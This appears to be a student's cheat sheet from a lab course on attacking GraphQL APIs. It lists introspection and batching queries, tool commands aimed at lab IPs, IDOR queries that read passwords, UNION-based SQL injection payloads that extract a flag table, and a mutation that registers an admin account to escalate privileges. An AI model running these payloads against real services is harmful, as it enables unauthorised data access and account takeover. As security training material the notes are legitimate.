# Attacking GraphQL

**[GraphQL Learn](https://graphql.org/learn/)**

## Basic Examples

**GraphQL Request**
```json
{
  users {
    id
    username
    role
  }
}
```

**GraphQL Response**
```json
{
  "data": {
    "users": [
      { "id": 1, "username": "htb-stdnt", "role": "user" },
      { "id": 2, "username": "admin",     "role": "admin" }
    ]
  }
}
```

## Introspection Queries

Introspection is a GraphQL feature that enables users to query the GraphQL API about the structure of the backend system.

**GraphQL Types**
```json
{
  __schema {
    types {
      name
    }
  }
}
```

**GraphQL Queries**
```json
{
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}
```

**General Introspection**
```json
  query IntrospectionQuery {
    __schema {
      queryType { name }
      mutationType { name }
      subscriptionType { name }
      types { ...FullType }
      directives {
        name
        description
        locations
        args { ...InputValue }
      }
    }
  }
  fragment FullType on __Type {
    kind name description
    fields(includeDeprecated: true) {
      name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason
    }
    inputFields { ...InputValue }
    interfaces { ...TypeRef }
    enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason }
    possibleTypes { ...TypeRef }
  }
  fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue }
  fragment TypeRef on __Type {
    kind name
    ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name }}}}}}}
  }
```

## Batching Example
```json
POST /graphql HTTP/1.1
Host: 172.17.0.2
Content-Type: application/json

[
  { "query": "{user(username: \"admin\") {uuid}}" },
  { "query": "{post(id: 1) {title}}" }
]
```

## Mutation Example
```json
mutation {
  registerUser(input: {
    username: "vautia"
    password: "5f4dcc3b5aa765d61d8327deb882cf99"
    role: "user"
    msg: "newUser"
  }) {
    user {
      username
      password
      msg
      role
    }
  }
}
```

## Tools

- [graphw00f](https://github.com/dolevf/graphw00f) – GraphQL endpoint fingerprinting
- [graphql-voyager](https://apis.guru/graphql-voyager/) – Visual schema explorer
- [GraphQL-Cop](https://github.com/dolevf/graphql-cop) – Security testing tool
- [InQL](https://github.com/doyensec/inql) – Burp Suite extension for GraphQL
- [GraphQL Threat Matrix](https://github.com/nicholasaleks/graphql-threat-matrix)

### graphw00f

```bash
git clone https://github.com/dolevf/graphw00f
cd graphw00f
python3 main.py -f -d -t http://STMIP:STMPO
```

### GraphQL-Cop

```bash
git clone https://github.com/dolevf/graphql-cop
cd graphql-cop
python3 -m venv path/to/venv
source path/to/venv/bin/activate
python3 -m pip install -r requirements.txt
python3 graphql-cop.py -h
python3 graphql-cop/graphql-cop.py -t http://172.17.0.2/graphql
```

## Insecure Direct Object Reference (IDOR)

### Identifying IDOR

Replace a query value with another we know exists:
![identifying idor](../images/idor_2.png)

### Exploiting IDOR

Replace query with introspection query to determine what data can be accessed
```json
{"query":"{  __type(name: \"allProducts\") {    name    fields {      name      type {        name        kind      }    }  }}"}
```

Adjust query to test if previously determined data fields are accessible

```json
{  user(username: "test") {    username    password  }}
```

## Injection Attacks

### SQL Injection

- Use introspection to identify what queries requiring arguments the backend supports
- Sending queries without arguments to see if error message is returned
- Try basic SQLi in the argument:
```json
{
  user(username: "test' -- -") {
    username
    password
  }
}
```
- or:
```json
{
  user(username: "test'") {
    username
    password
  }
}
```
- use results of introspection query to craft UNION-based SQLi:
![introspection query results](../images/introspection_results.png)
```json
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {
    username
  }
}
```
```json
{"query":"{  user(username: \"student' UNION SELECT 1,2,GROUP_CONCAT(column_name),4,5,6 FROM information_schema.columns WHERE table_name='flag'-- -\") {    username  }}"}
```
```json
{"query":"{  user(username: \"student' UNION SELECT 1,2,flag,4,5,6 FROM flag-- -\") {    username  }}"}
```

### Cross-Site Scripting (XSS)

XSS vulnerabilities can occur if:
- GraphQL responses are inserted into the HTML page without proper sanitization
- if invalid arguments are reflected in error messages

## Mutations

- Identify all mutations
```json
query {
  __schema {
    mutationType {
      name
      fields {
        name
        args {
          name
          defaultValue
          type {
            ...TypeRef
          }
        }
      }
    }
  }
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```
- Query fields of required inputs from results of above
```json
{   
  __type(name: "RegisterUserInput") {
    name
    inputFields {
      name
      description
      defaultValue
    }
  }
}
```
- Test if escalation available
```json
mutation {
  registerUser(input: {username: "vautiaAdmin", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "admin", msg: "Hacked!"}) {
    user {
      username
      password
      msg
      role
    }
  }
}
```